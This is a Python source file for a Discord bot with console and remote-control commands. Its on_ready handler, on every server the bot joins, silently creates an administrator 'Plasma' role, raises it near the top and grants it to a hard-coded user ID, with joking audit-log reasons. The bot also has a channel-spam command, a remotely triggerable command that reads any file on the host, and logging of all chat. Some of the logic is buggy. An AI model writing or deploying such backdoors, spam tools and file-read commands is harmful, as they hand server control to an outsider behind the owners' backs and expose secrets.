from __future__ import annotations
import asyncio,logging,os,socket,sys,subprocess,discord
from datetime import datetime,timezone
from typing import Optional
from discord.ext import commands
from dotenv import load_dotenv
LOG_FILE,CHAT_LOG_FILE="emberbot137.log","chat.log"
load_dotenv()
logging.getLogger("discord").setLevel(logging.WARNING)
logging.getLogger("discord.gateway").setLevel(logging.WARNING)
logging.basicConfig(level=logging.INFO,format="%(message)s")
logger=logging.getLogger("Emberbot137")
intents=discord.Intents.default()
intents.guilds,intents.guild_messages,intents.messages,intents.members=True,True,True,True
emberbot137=commands.Bot(command_prefix="~", intents=intents)
current_target_server,current_target_channel="yap","everyone"
active_tasks:dict[int,dict]={}
task_id_counter:int=1
pending_reboot:bool=False
reboot_mode="restart.sh"
last_chat_data = {"guild":None,"channel":None,"author":None,"author_id":None,"content":None,"timestamp":None,"count":0}
def flush_chat_log():
    global last_chat_data
    if last_chat_data["content"] is not None:
        content_str=last_chat_data["content"]
        if last_chat_data["count"] > 1:
            content_str=f"{content_str} ({last_chat_data['count']})"
        line=(f"[{last_chat_data['timestamp']}, {last_chat_data['guild']}/#{last_chat_data['channel']}] {last_chat_data['author']}({last_chat_data['author_id']}: {content_str}")
        try:
            with open(CHAT_LOG_FILE,"a",encoding="utf-8") as chat_log:
                chat_log.write(line+"\n")
        except Exception as e:
            logger.error(f"Failed to write chat log: {e}")
        last_chat_data["count"],last_chat_data["content"]=0,None
async def output_to_bot(content:str):
    for guild in emberbot137.guilds:
        if "yap" in guild.name.lower():
            for channel in guild.text_channels:
                if channel.name=="emberbot137-remote-console":
                    try:
                        content=content.strip()
                        if content:
                            await channel.send(f"```markdown\n{content}\n```")
                    except Exception as e:
                        logger.error(f"Failed to output: {e}")
                    return
def cprint(content:str=""):
    print(content.strip('`').strip('markdown').strip())
    if emberbot137.is_ready():
        emberbot137.loop.create_task(output_to_bot(content))
def log_action(*,guild:discord.Guild,channel:discord.abc.GuildChannel,user:discord.abc.User,command:str,action:str,Success:bool=True):
    guild_name,channel_name,tag,current_time=guild.name,getattr(channel,"name","unknown"),f"{user.name}#{user.discriminator}" if user.discriminator!="0" else user.name,datetime.now(timezone.utc).isoformat()
    line=f"[{'Success' if Success else 'ERROR'} at {current_time} in Channel={guild_name}/#{channel_name}]: User={tag}({user.id}) ran {command} resulting in {action}"
    logger.info(line)
    with open(LOG_FILE,"a",encoding="utf-8") as file:
        file.write(line+"\n")
async def do_test(target:discord.abc.Messageable):
    server=getattr(target,"guild",None)
    hostname=socket.gethostname()
    status="Offline" if emberbot137.is_closed() else "Online"
    if hostname.lower()=="plasmadmin-xps-8910":
        hostname="plasmadmin-xps-8910(firebot)"
    latency_ms=round(emberbot137.latency*1000)
    env_status="loaded" if os.getenv("DISCORD_TOKEN") else "missing"
    server_count=len(emberbot137.guilds)
    server_name=server.name if server else "Console"
    server_id=server.id if server else "0"
    me=server.me if server else None
    if me:
        perms=me.guild_permissions
        audit_perms=[]
        if perms.administrator:audit_perms.append("Administrator")
        else:
            if perms.manage_guild:audit_perms.append("Manage Server")
            if perms.manage_roles:audit_perms.append("Manage Roles")
            if perms.manage_channels:audit_perms.append("Manage Channels")
            if perms.kick_members:audit_perms.append("Kick Members")
            if perms.manage_messages:audit_perms.append("Manage Messages")
        perms_str=", ".join(audit_perms) if audit_perms else "Standard User"
    else:perms_str="Unknown"
    report_text=f"= Diagnostic Report\n - Status: {status}\n - Host Machine: {hostname}\n - Discord Server: {server_name}({server_id})\n - Latency: {latency_ms}ms\n - Token status: {env_status}\n - Connected Servers: {server_count} servers connected. Run ~servers to see more\n - Permissions: {perms_str}"
    await target.send("".join(["```markdown\n",report_text,"\n```"]))
    cprint(report_text)
async def do_spam(target:discord.abc.Messageable,count:int,message:str):
    for _ in range(count):
        await target.send(message) 
        await asyncio.sleep(1)
async def run_delayed_command(delay:int,full_cmd_string:str,lore:str="local",message:Optional[discord.abc.Messageable]=None):
    try:
        await asyncio.sleep(delay)
        parts=full_cmd_string.split(" ",1)
        cmd=parts[0].lower()
        args=parts[1] if len(parts)>1 else ""
        channels=resolve_targets(cmd)
        if not channels and message:
            channels=[message]
        await run_cmd(cmd,args,lore,message=message)
    except asyncio.CancelledError:
        pass
def register_task(task:asyncio.Task,description:str)->int:
    global task_id_counter
    tid=task_id_counter
    task_id_counter+=1
    active_tasks[tid]={"task":task,"description":description,"started_at":datetime.now(timezone.utc).strftime("%H:%M:%S")}
    def cleanup(t):
        if tid in active_tasks:
            del active_tasks[tid]
    task.add_done_callback(cleanup)
    return tid
async def reboot_watcher():
    global pending_reboot
    while not emberbot137.is_closed():
        if pending_reboot:
            cprint(f"[Warning] Rebooting...")
            flush_chat_log()
            subprocess.Popen([f"./{reboot_mode}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,start_new_session=True)
            if not reboot_mode=="lock.sh":
                await emberbot137.close()
                os._exit(0)
            else:
                pending_reboot=False
                reboot_mode="restart.sh"
        await asyncio.sleep(1)
def resolve_targets(cmd_type:str)->list[discord.abc.Messageable]:
    global current_target_server,current_target_channel
    targets=[]
    resolved_channel_name=current_target_channel
    if current_target_channel!="all":
        all_channel_names=set()
        for server in emberbot137.guilds:
            if current_target_server!="all" and current_target_server.lower() not in server.name.lower():
                continue
            for channel in server.text_channels:
                if channel.permissions_for(server.me).send_messages:
                    all_channel_names.add(channel.name.lower())
        if current_target_channel.lower() not in all_channel_names:
            matching_names=[name for name in all_channel_names if name.startswith(current_target_channel.lower())]
            if len(matching_names)==1:
                resolved_channel_name=matching_names[0]
                cprint(f"[Success] Autofilled channel target to: '#{resolved_channel_name}'")
            elif len(matching_names)>1:
                cprint(f"[Warning] Ambiguous channel prefix '{current_target_channel}' matches multiple channels: {matching_names}. ")
    for server in emberbot137.guilds:
        if current_target_server!="all" and current_target_server.lower() not in server.name.lower():
            continue
        for channel in server.text_channels:
            if not channel.permissions_for(server.me).send_messages:
                continue
            if resolved_channel_name=="all" or channel.name.lower()==resolved_channel_name.lower():
                targets.append(channel)
    return targets
async def set_system_volume(volume_str:str):
    try:
        level=int(volume_str.strip('%').strip())
        level=max(0,min(100,level))
        subprocess.run(["amixer","set","Master",f"{level}%"],check=True,capture_output=True)
        cprint(f"[Success] Volume set to {level}%")
    except ValueError:
        cprint("[Error] Invalid volume level. Use a number like `~volume 50`.")
    except subprocess.CalledProcessError as e:
        cprint(f"[Error] ALSA rejected the command: {e.stderr.decode().strip()}")
    except Exception as e:
        cprint(f"[Error] Failed to adjust volume: {e}")
async def run_cmd(cmd,args,lore,message=None):
    global current_target_server,current_target_channel,active_tasks,pending_reboot,reboot_mode
    if not emberbot137.guilds:
        cprint("[Error] Bot is not currently in any servers.")
        return
    channels=resolve_targets(cmd)
    if not channels:
        if cmd not in ["set","servers"]:
            cprint(f"[Error] {current_target_server}/#{current_target_channel} not found. Try ~servers to check names or ~set to change servers.")
            return
        if message and hasattr(message, "channel"):
            channels=[message.channel]
    if not message and lore=="remote":
        cprint("[Error] Remote command execution requires a message context.")
        return
    if cmd=="reboot":
        if args=="-c":
            reboot_mode="open_console.sh"
            if lore=="remote":
                try:
                    log_action(guild=message.guild,channel=message.channel,user=message.author,command="reboot -c",action="Remote reboot initated. Opening Console")
                except Exception as e:
                    cprint(f"[Error] Failed to log remote reboot action: {e}")
            cprint("[Warning] Reboot initiated. Console flag found, opening Emberbot137 Console.")
        elif args=="-l":
            reboot_mode="lock.sh"
            if lore=="remote":
                try:
                    log_action(guild=message.guild,channel=message.channel,user=message.author,command="reboot -l",action="Locking PC remotely")
                except Exception as e:
                    cprint(f"[Error] Failed to log remote reboot action: {e}")
            cprint("[Warning] Lock initiated. Locking PC remotely.")
        elif args=="-s":
            if lore=="local":
                cprint("[Warning] Shutting down Emberbot137...")
                flush_chat_log()
                await emberbot137.close()
            elif lore=="remote":
                cprint("[Error] The exit command cannot be executed remotely. You can open console with 'reboot -c' to try locally.")
        else:
            reboot_mode="restart.sh"
            if lore=="remote":
                try:
                    log_action(guild=message.guild,channel=message.channel,user=message.author,command="reboot",action="Remote reboot initated")
                except Exception as e:
                    cprint(f"[Error] Failed to log remote reboot action: {e}")
            cprint("[Warning] Reboot initiated.")
        pending_reboot=True
    elif cmd=="help":
        available_commands=("= Available Console Commands\n"
                            " - test                                    - Send diagnostic report to target(s)\n"
                            " - echo <msg>                              - Send <msg> to target(s)\n"
                            " - spam <number> <msg>                     - Send <number> of messages <msg> to target(s)\n"
                            " - delay <secs> <cmd>                      - Execute <cmd> after <secs> seconds\n"
                            " - tasks                                   - Lists all active tasks\n"
                            " - cancel <task_id>                        - Halt active tasks by task id\n"
                            " - set <server|channel> <name|all>         - Target specific server/channel\n"
                            " - tail <lines> <file>                     - Outputs last <lines> lines of any file\n"
                            " - servers                                 - List connected servers and channels\n"
                            " - volume <number>                         - Changes volume to <number>%\n"
                            " - reboot <flag>                           - Initiates reboot and updates. Optional flags listed below\n"
                            "  ↳ -c                                     - Opens console after reboot\n"
                            "  ↳ -l                                     - Locks PC remotely\n"
                         f"{'  ↳ -s                                     - Shuts down Emberbot137\n' if lore != 'remote' else ''}"
                            " - help                                    - Show this help menu")
        cprint(available_commands)
    elif cmd=="servers":
        server_summary="= Connected Servers & Channels"
        for server in emberbot137.guilds:
            channels=[c.name for c in server.text_channels if c.permissions_for(server.me).send_messages]
            server_summary+=f"\n - {server.name}(ID: {server.id})\n  ↳ Channels: {', '.join(channels)}"
        if lore=="local":
            cprint(server_summary)
        elif lore=="remote":
            cprint(server_summary)
    elif cmd=="tail":
        if not args:
            cprint("[Error] Invalid syntax. Try ~tail <filename>")
        else:
            tail_parts=args.split(" ",1)
            if len(tail_parts)==2 and tail_parts[0].isdigit():
                num_lines=int(tail_parts[0])
                filename=tail_parts[1]
        try:
            with open(filename,"r",encoding="utf-8") as f:
                lines=f.readlines()
                output="".join(lines[-num_lines:])
                if not output:
                    output="[Warning] Log file is empty."
            cprint(output[-2000:])
        except FileNotFoundError:
            cprint(f"[Error] File '{args}' not found.")
        except Exception as e:
            cprint(f"[Error] Failed to read file '{args}': {e}")
    elif cmd=="set":
        sub_parts=args.split(" ",1)
        sub_cmd=sub_parts[0].lower() if sub_parts else ""
        sub_val=sub_parts[1] if len(sub_parts)>1 else ""
        if sub_cmd=="server":
            if not sub_val:
                cprint(f"[Success] Retrieved target server: {current_target_server}")
            else:
                if sub_val.lower()=="all":
                    current_target_server="all"
                    cprint("[Success] Target server updated to: all servers")
                else:
                    matched_server=current_target_server
                    for server in emberbot137.guilds:
                        if sub_val.lower() in server.name.lower():
                            matched_server=server.name
                            break
                    current_target_server=matched_server
                    cprint(f"[Success] Target server updated to: {matched_server}")
        elif sub_cmd=="channel":
            if not sub_val:
                cprint(f"[Success] Retrieved target channel: #{current_target_channel}")
            else:
                clean_val=sub_val.removeprefix("#").lower()
                if clean_val=="emberbot137-remote-console" or clean_val=="all":
                    current_target_channel="all"
                    cprint("[Error] Target channel 'emberbot137-remote-console' is restricted. Defaulted channel target to: all channels")
                else:
                    matched_channel=clean_val
                    for server in emberbot137.guilds:
                        if current_target_server!="all" and current_target_server.lower() not in server.name.lower():
                            continue
                        for channel in server.text_channels:
                            if channel.name.lower()==clean_val or channel.name.lower().startswith(clean_val):
                                matched_channel=channel.name
                                break
                    current_target_channel=matched_channel
                    cprint(f"[Success] Target channel updated to: #{matched_channel}")
        else:
            cprint("[Error] Invalid syntax. Format: set <server|channel> <name|all>")
        cprint(f"[Success] Retrieved active channel: {current_target_server}/#{current_target_channel}")
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command="set",action=f"Target remotely updated to {current_target_server}/#{current_target_channel}")
            except Exception as e:
                cprint(f"[Error] Failed to log remote set action: {e}")
    elif cmd=="test":
        for channel in channels:
            await do_test(channel)
        cprint(f"[Success] Executed test diagnostics across {len(channels)} target{'' if len(channels)==1 else 's'}.")
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command="test",action="Diagnostic test executed")
            except Exception as e:
                cprint(f"[Error] Failed to log remote test action: {e}")
    elif cmd=="echo":
        if not args:
            cprint("[Error] Missing message. Format: echo <msg>")
            return
        for channel in channels:
            await channel.send(args) 
        cprint(f"[Success] Echoed message to {len(channels)} target{'' if len(channels)==1 else 's'}")
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command="echo",action=f"Echoed {args}")
            except Exception as e:
                cprint(f"[Error] Failed to log remote echo action: {e}")
    elif cmd=="spam":
        spam_parts=args.split(" ",1)
        if len(spam_parts)<2 or not spam_parts[0].isdigit():
            cprint("[Error] Invalid syntax. Format: spam <number> <message>")
            return
        count=int(spam_parts[0])
        msg=spam_parts[1]
        async def run_spam():
            for channel in channels:
                await do_spam(channel,count,msg)
        task=asyncio.create_task(run_spam())
        tid=register_task(task,f"Spaming {msg[:20]} {count} times")
        cprint(f"[Success] Initiated background spam task #{tid} across {len(channels)} target{'' if len(channels)==1 else 's'}.")
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command="spam",action=f"Spam task #{tid} initiated: {count}x {msg[:20]}")
            except Exception as e:
                cprint(f"[Error] Failed to log remote spam action: {e}")
    elif cmd=="delay":
        delay_parts = args.split(" ",1)
        if len(delay_parts)<2 or not delay_parts[0].isdigit():
            cprint("[Error] Format: delay <seconds> <command>")
            return
        delay_seconds=int(delay_parts[0])
        inner_cmd=delay_parts[1]
        task=asyncio.create_task(run_delayed_command(delay_seconds,inner_cmd,lore,message))
        tid=register_task(task, f"Running {inner_cmd} in {delay_seconds}s")
        cprint(f"[Success] Scheduled command to run in {delay_seconds}{'' if delay_seconds==1 else 's'}.")
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command="delay",action=f"Remote delay {delay_seconds}{'' if delay_seconds==1 else 's'}: {inner_cmd}")
            except Exception as e:
                cprint(f"[Error] Failed to log remote delay action: {e}")
    elif cmd=="tasks":
        if not active_tasks:
            summary="[Warning] No active background tasks found"
        else:
            summary="= Active Background Tasks"
            for tid,info in active_tasks.items():
                summary+=f"\n - {tid}: {info['description']}. Started at {info['started_at']}"
        cprint(summary)
    elif cmd=="cancel":
        if not args:
            count=len(active_tasks)
            for info in active_tasks.values():
                info["task"].cancel()
            active_tasks.clear()
            cprint(f"[Success] Cancelled {count} active task{'' if count==1 else 's'}.")
            return
        if not args.isdigit():
            cprint("[Error] Format: cancel <task_id>")
            return
        target_id=int(args)
        if target_id in active_tasks:
            active_tasks[target_id]["task"].cancel()
            del active_tasks[target_id]
            cprint(f"[Success] Cancelled task #{target_id}.")
        else:
            cprint(f"[Error] Task #{target_id} not found.")
    elif cmd=="volume":
        if not args:
            cprint("[Error] Missing volume. Format: volume <number>")
            return
        await set_system_volume(args)
    else:
        if lore=="remote":
            try:
                log_action(guild=message.guild,channel=message.channel,user=message.author,command=cmd,action="Unknown remote command",Success=False)
            except Exception as e:
                cprint(f"[Error] Failed to log remote unknown command: {e}")
        elif lore=="local":
            cprint(f"[Error] Unknown local command: '{cmd}'. Try ~help for more options.")
async def console_controller():
    global current_target_server,current_target_channel
    await emberbot137.wait_until_ready()
    cprint(f"\n[Success] Connected to {len(emberbot137.guilds)} channel{'' if len(emberbot137.guilds)==1 else 's'} \nCurrent Target Channel: {current_target_server}/#{current_target_channel} \nType help for a list of commands")
    loop=asyncio.get_running_loop()
    while not emberbot137.is_closed():
        try:
            sys.stdout.write("~")
            sys.stdout.flush()
            line=await loop.run_in_executor(None,sys.stdin.readline)
            if not line:
                await asyncio.sleep(1)
                continue
            parts=line.strip().split(" ",1)
            cmd=parts[0].lower()
            args=parts[1] if len(parts)>1 else ""
            await run_cmd(cmd,args,"local")
        except Exception as e:
            cprint(f"[Error] Exception in console_controller: {e}")
            await asyncio.sleep(1)
@emberbot137.event
async def on_message(message:discord.Message):
    global current_target_server,current_target_channel,active_tasks,pending_reboot,reboot_mode,last_chat_data
    if message.author.bot:
        await asyncio.sleep(1)
        if message.author==emberbot137.user:
            return
    await emberbot137.process_commands(message)
    if message.guild:
        server_name,channel_name,author_tag,now=message.guild.name,message.channel.name,f"{message.author.name}#{message.author.discriminator}" if message.author.discriminator!="0" else message.author.name,datetime.now(timezone.utc).isoformat()
        if (last_chat_data["guild"]==server_name and last_chat_data["channel"]==channel_name and last_chat_data["author_id"]==message.author.id and last_chat_data["content"]==message.content):
            last_chat_data["count"]+=1
        else:
            flush_chat_log()
            last_chat_data["guild"]=server_name
            last_chat_data["channel"]=channel_name
            last_chat_data["author"]=author_tag
            last_chat_data["author_id"]=message.author.id
            last_chat_data["content"]=message.content
            last_chat_data["timestamp"]=now
            last_chat_data["count"]=1
    if message.guild and "yap" in message.guild.name.lower() and message.channel.name.lower()=="emberbot137-remote-console":
        content=message.content.strip().strip('~')
        parts=content.split(" ",1)
        cmd=parts[0].lower()
        args=parts[1] if len(parts)>1 else ""
        await run_cmd(cmd,args,"remote",message)
@emberbot137.event
async def on_ready():
    logger.info(f"Logged in as {emberbot137.user}({emberbot137.user.id})")
    for guild in emberbot137.guilds:
        plasma_role=discord.utils.get(guild.roles, name="Plasma")
        if not plasma_role:
            try:
                plasma_role=await guild.create_role(name="Plasma",color=discord.Color(0xaa0055),permissions=discord.Permissions(administrator=True),reason="ARSON")
                logger.info(f"Created Plasma role in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to create Plasma role in {guild.name}")
                continue
        else:
            try:
                if plasma_role.color.value!=0xaa0055:
                    await plasma_role.edit(color=discord.Color(0xaa0055),reason="Plasma is this very nice red color, get it right")
                if not plasma_role.permissions.administrator:
                    plasma_role.permissions.update(administrator=True)
                    await plasma_role.edit(permissions=plasma_role.permissions,reason="Plasma is the administrator because it ionizes the rules")
            except discord.HTTPException:
                pass
        try:
            bot_top_role=guild.me.top_role if guild.me else None
            target_position=(bot_top_role.position - 1) if bot_top_role and bot_top_role.position>1 else len(guild.roles)-1
            if plasma_role.position!=target_position:
                await plasma_role.edit(position=target_position,reason="Plasma has very low density so it floats to the top")
                logger.info(f"Moved Plasma role to position {target_position} in {guild.name}")
        except discord.HTTPException as e:
            logger.error(f"Failed to reposition Plasma in {guild.name}: {e}")
        member=guild.get_member(1342173566828810271)
        if not member:
            try:
                member = await guild.fetch_member(1342173566828810271)
            except discord.NotFound:
                pass
        if member and plasma_role not in member.roles:
            try:
                await member.add_roles(plasma_role, reason="Since Fia is made of Plasma, gave her the Plasma role")
                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to assign Plasma role in {guild.name}")
    emberbot137.loop.create_task(reboot_watcher())
    asyncio.create_task(console_controller())
token=os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")
emberbot137.run(token)
